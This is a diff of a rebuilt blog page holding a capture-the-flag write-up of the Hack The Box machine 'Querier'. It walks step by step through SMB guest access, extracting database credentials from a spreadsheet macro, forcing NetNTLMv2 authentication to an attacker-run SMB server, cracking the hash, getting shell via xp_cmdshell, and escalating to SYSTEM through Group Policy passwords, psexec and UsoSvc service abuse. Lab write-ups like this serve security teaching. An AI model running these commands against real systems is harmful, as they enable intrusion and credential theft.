@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Querier write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -314,7 +314,7 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>)</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.125 -o querier_enum.txt
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.125 -o querier_enum.txt
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-21 16:06:53 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -397,21 +397,21 @@ HOP RTT      ADDRESS
 2   64.12 ms QUERIER (10.10.10.125)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 72.45 seconds</code></pre></div></div>
+Nmap done: 1 IP address (1 host up) scanned in 72.45 seconds</code></pre></div>
 
 <h2 id="discovering-shares">Discovering shares</h2>
 
 <p>Let&rsquo;s enum shares:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 
 [+] Finding open SMB ports....
 [+] User SMB session establishd on 10.10.10.125...
 [+] IP: 10.10.10.125:445  Name: QUERIER                                           
   Disk                                            Permissions
   ----                                            -----------
-[!] Access Denied</code></pre></div></div></p>
+[!] Access Denied</code></pre></div></p>
 
 <p>Hmmmm&hellip;. Let&rsquo;s try a dummy username:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 -u &#39;type_whatever_you_want_here&#39;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 -u &#39;type_whatever_you_want_here&#39;
 [+] Finding open SMB ports....
 [+] Guest SMB session established on 10.10.10.125...
 [+] IP: 10.10.10.125:445  Name: QUERIER                                           
@@ -420,11 +420,11 @@ Nmap done: 1 IP address (1 host up) scanned in 72.45 seconds</code></pre></div><
   ADMIN$                                              NO ACCESS
   C$                                                  NO ACCESS
   IPC$                                                READ ONLY
-  Reports                                             READ ONLY</code></pre></div></div></p>
+  Reports                                             READ ONLY</code></pre></div></p>
 
 <p>Surprise, surprise. It works (stupid SMB protocol :P). Let&rsquo;s use Impacket&rsquo;s smbclient.py to examine the &lsquo;Reports&rsquo; share:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient.py -no-pass QUERIER/username_does_not_matter@10.10.10.125
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbclient.py -no-pass QUERIER/username_does_not_matter@10.10.10.125
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
 Type help for list of commands
@@ -439,15 +439,15 @@ drw-rw-rw-          0  Tue Jan 29 01:26:31 2019 .
 drw-rw-rw-          0  Tue Jan 29 01:26:31 2019 ..
 -rw-rw-rw-      12229  Tue Jan 29 01:26:31 2019 Currency Volume Report.xlsm
 # get Currency Volume Report.xlsm
-# exit</code></pre></div></div>
+# exit</code></pre></div>
 
 <p>We can open this xlsm file using -for example- LibreOffice. If we examine the macros (Tools -&gt; Macros -&gt; Edit Macros) we discover some MSSQL credentials:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">...
+<div class="bg-black"><pre><code class="language-console" data-lang="console">...
 conn.ConnectionString = &#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&#34;
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>In case you didn&rsquo;t know it, xlsm, xlsx, docx et.c. are just zip archives. Therefore, we can decompress them:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ unzip Currency\ Volume\ Report.xlsm 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ unzip Currency\ Volume\ Report.xlsm 
 Archive:  Currency Volume Report.xlsm
   inflating: [Content_Types].xml     
   inflating: _rels/.rels             
@@ -463,10 +463,10 @@ Archive:  Currency Volume Report.xlsm
 $ strings xl/vbaProject.bin
 ...
 Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Let&rsquo;s try to connect to the MS SQL server using Impacket&rsquo;s msssqlclient.py:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mssqlclient.py -windows-auth QUERIER/reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mssqlclient.py -windows-auth QUERIER/reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
@@ -477,26 +477,26 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [*] INFO(QUERIER): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
 [!] Press help for extra shell commands
-SQL&gt;</code></pre></div></div></p>
+SQL&gt;</code></pre></div></p>
 
 <p>Neat! Now, let&rsquo;s try to execute a command using the &lsquo;xp_cmdshell&rsquo; procedure:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">SQL&gt; EXEC xp_cmdshell &#34;whoami&#34;
-[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">SQL&gt; EXEC xp_cmdshell &#34;whoami&#34;
+[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.</code></pre></div></p>
 
 <p>Hmmm, well that didn&rsquo;t work. Let&rsquo;s try to activate &lsquo;xp_cmdshell&rsquo;:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">SQL&gt; EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;,1;RECONFIGURE;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">SQL&gt; EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;,1;RECONFIGURE;
 [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
 [-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
 [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
 [-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
-SQL&gt; </code></pre></div></div></p>
+SQL&gt; </code></pre></div></p>
 
 <p>Nope. Apparently the user &lsquo;reporting&rsquo; doesn&rsquo;t have the required privileges/permissions.</p>
 
 <h1 id="capturing-credentials">Capturing credentials</h1>
 
 <p>Well, we can try -using our &lsquo;reporting&rsquo; account- to capture some other credentials&hellip; We will use Impacket&rsquo;s smbserver.py to listen for incoming SMB connections::
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo smbserver.py -smb2support myshare /tmp
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo smbserver.py -smb2support myshare /tmp
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Config file parsed
@@ -504,19 +504,19 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 [*] Config file parsed
 [*] Config file parsed
-[*] Config file parsed</code></pre></div></div></p>
+[*] Config file parsed</code></pre></div></p>
 
 <p>Now, we can use msdat tool (<a href="https://github.com/quentinhardy/msdat" target="_blank">https://github.com/quentinhardy/msdat</a>) to send some traffic towards our SMB server:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msdat smbauthcapture -v -s 10.10.10.125 -p 1433 -D QUERIER -U reporting -P &#39;PcwTWTHRwryjc$c6&#39; --capture 10.10.15.16
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msdat smbauthcapture -v -s 10.10.10.125 -p 1433 -D QUERIER -U reporting -P &#39;PcwTWTHRwryjc$c6&#39; --capture 10.10.15.16
 
 [1] (10.10.10.125:1433): Try to capture a SMB authentication with the xp_dirtree, xp_fileexist or xp_getfiledetails method
 00:51:22 INFO -: Test all methods allowing to capture a SMB authentication...
 00:51:22 INFO -: Capturing SMB Authentication via XP_DIRTREE...
 00:51:23 INFO -: No error during the running: you could capture the SMB authentication
-[+] You can perhaps capture a SMB authentication with these methods. Check your SMB capture tool !</code></pre></div></div></p>
+[+] You can perhaps capture a SMB authentication with these methods. Check your SMB capture tool !</code></pre></div></p>
 
 <p>Let&rsquo;s see what we received in our SMB server:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[*] Incoming connection (10.10.10.125,49741)
+<div class="bg-black"><pre><code class="language-console" data-lang="console">[*] Incoming connection (10.10.10.125,49741)
 [*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
 [*] User mssql-svc\QUERIER authenticated successfully
 [*] mssql-svc::QUERIER:4141414141414141:790d1a20ff18cdb330b3b6e43bca6988:010100000000000000e901777b28d50126ad6b81542b18860000000001001000780051004d005a004a006f004f00730002001000780048004f00540045006b006300610003001000780051004d005a004a006f004f00730004001000780048004f00540045006b00630061000700080000e901777b28d50106000400020000000800300030000000000000000000000000300000590946bc19d0765a150c1c561e8ea40b9f0627e137bb3b8950ad8952e5b6f3930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003600000000000000000000000000
@@ -529,40 +529,40 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [*] Disconnecting Share(1:IPC$)
 [*] Handle: [Errno 104] Connection reset by peer
 [*] Closing down connection (10.10.10.125,49741)
-[*] Remaining connections []</code></pre></div></div></p>
+[*] Remaining connections []</code></pre></div></p>
 
 <p>Let&rsquo;s try to crack/reverse this hash using hashcat:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h  | grep -i NetNTLMv2
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hashcat -h  | grep -i NetNTLMv2
    5600 | NetNTLMv2                                        | Network Protocols
 
 $ hashcat -m 5600 mssql-svc::QUERIER:4141414141414141:790d1a20ff18cdb330b3b6e43bca6988:010100000000000000e901777b28d50126ad6b81542b18860000000001001000780051004d005a004a006f004f00730002001000780048004f00540045006b006300610003001000780051004d005a004a006f004f00730004001000780048004f00540045006b00630061000700080000e901777b28d50106000400020000000800300030000000000000000000000000300000590946bc19d0765a150c1c561e8ea40b9f0627e137bb3b8950ad8952e5b6f3930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003600000000000000000000000000 /usr/share/dict/rockyou.txt
 
 ...
 
-corporate568</code></pre></div></div></p>
+corporate568</code></pre></div></p>
 
 <h1 id="getting-mssql-shell-as-mssql-svc">Getting (mssql) shell as mssql-svc</h1>
 
 <p>It&rsquo;s high time to get a shell. We can use a tool I wrote (<a href="https://alamot.github.io/mssql_shell/" target="_blank">https://alamot.github.io/mssql_shell/</a>). First, we have to edit some settings inside the script:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">...
+<div class="bg-black"><pre><code class="language-console" data-lang="console">...
 MSSQL_SERVER=&#34;10.10.10.125&#34;
 MSSQL_USERNAME = &#34;QUERIER\\mssql-svc&#34;
 MSSQL_PASSWORD = &#34;corporate568&#34;
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Now, let&rsquo;s run it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python mssql_shell.py 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python mssql_shell.py 
 Successful login: QUERIER\mssql-svc@10.10.10.125
 Trying to enable xp_cmdshell ...
 CMD mssql-svc@QUERIER C:\Windows\system32&gt; whoami
 querier\mssql-svc
 CMD mssql-svc@QUERIER C:\Windows\system32&gt; type C:\Users\mssql-svc\Desktop\user.txt
-c*****************************6</code></pre></div></div></p>
+c*****************************6</code></pre></div></p>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
 <p>Let&rsquo;s upload PowerUp.ps1 (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):" target="_blank">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):</a>
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Windows\system32&gt; cd C:\Users\Public
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Windows\system32&gt; cd C:\Users\Public
 CMD mssql-svc@QUERIER C:\Users\Public&gt; UPLOAD PowerUp.ps1 C:\Users\Public\PowerUp.ps1
 Uploading PowerUp.ps1 to C:\Users\Public\PowerUp.ps1
 Data length (b64-encoded): 732KB
@@ -572,10 +572,10 @@ Output Length = 562841
 CertUtil: -decode command completed successfully.
 MD5 hashes match: 711ca55ca8d9ba4f776ce052417fd98f
 *** UPLOAD PROCEDURE FINISHED *** 
-CMD mssql-svc@QUERIER C:\Users\Public&gt;</code></pre></div></div></p>
+CMD mssql-svc@QUERIER C:\Users\Public&gt;</code></pre></div></p>
 
 <p>Now, let&rsquo;s run PowerUp.ps1:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }&#34;
 CMD mssql-svc@QUERIER C:\Users\Public&gt; type powerup_output.txt
 ...
 [*] Checking service permissions...
@@ -604,12 +604,12 @@ NewName   : [BLANK]
 Passwords : {MyUnclesAreMarioAndLuigi!!1!}
 File      : C:\ProgramData\Microsoft\Group 
             Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <h2 id="using-group-policy-password-and-psexec-py">Using Group Policy password and psexec.py</h2>
 
 <p>We can use Impacket&rsquo;s psexec.py to get nt authority/system:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ psexec.py QUERIER/Administrator:&#39;MyUnclesAreMarioAndLuigi!!1!&#39;@10.10.10.125
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ psexec.py QUERIER/Administrator:&#39;MyUnclesAreMarioAndLuigi!!1!&#39;@10.10.10.125
 
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
@@ -630,14 +630,14 @@ nt authority\system
 C:\Windows\system32&gt;cd /users/administrator/desktop
 
 C:\Users\Administrator\Desktop&gt;type root.txt
-b******************************2</code></pre></div></div></p>
+b******************************2</code></pre></div></p>
 
 <p>Hooray! :D</p>
 
 <h2 id="ab-using-usosvc-service">(Ab)Using UsoSvc service</h2>
 
 <p>Let&rsquo;s examine the &ldquo;UsoSvc&rdquo; service:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; sc qc &#34;UsoSvc&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; sc qc &#34;UsoSvc&#34;
 [SC] QueryServiceConfig SUCCESS
 None
 SERVICE_NAME: UsoSvc
@@ -649,10 +649,10 @@ SERVICE_NAME: UsoSvc
         TAG                : 0
         DISPLAY_NAME       : Update Orchestrator Service
         DEPENDENCIES       : rpcss
-        SERVICE_START_NAME : LocalSystem</code></pre></div></div></p>
+        SERVICE_START_NAME : LocalSystem</code></pre></div></p>
 
 <p>Let&rsquo;s exploit it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
 CMD mssql-svc@QUERIER C:\Users\Public&gt; type output.txt
 
 ServiceAbused Command                                                                   
@@ -665,26 +665,28 @@ User accounts for \\QUERIER
 Administrator            DefaultAccount           Guest                    
 john                     mssql-svc                reporting                
 WDAGUtilityAccount       
-The command completed successfully.</code></pre></div></div></p>
+The command completed successfully.</code></pre></div></p>
 
 <p>Let&rsquo;s exploit it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
 CMD mssql-svc@QUERIER C:\Users\Public&gt; type output.txt
 
 ServiceAbused Command                                                                   
 ------------- -------                                                                   
-UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /add</code></pre></div></div></p>
+UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /add</code></pre></div></p>
 
 <p>Let&rsquo;s see if our exploitation was successful:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; net user
+<div class="bg-black"><pre><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; net user
 User accounts for \\QUERIER
 -------------------------------------------------------------------------------
 Administrator            DefaultAccount           Guest                    
 john                     mssql-svc                reporting                
 WDAGUtilityAccount       
-The command completed successfully.</code></pre></div></div>
+The command completed successfully.</code></pre></div>
 We could do also things like that et.c.:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sc config UsoSvc binPath=&#34;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&#34;</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sc config UsoSvc binPath=&#34;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\flag.txt&#34;
+$ sc stop &#34;UsoSvc&#34;
+$ sc start &#34;UsoSvc&#34;</code></pre></div></p>
 
 <p>That&rsquo;s all folks! :)</p>
 
@@ -708,466 +710,6 @@ We could do also things like that et.c.:
           
           
           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1216,21 +758,17 @@ We could do also things like that et.c.:
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1244,21 +782,45 @@ We could do also things like that et.c.:
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1372,6 +934,42 @@ We could do also things like that et.c.:
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
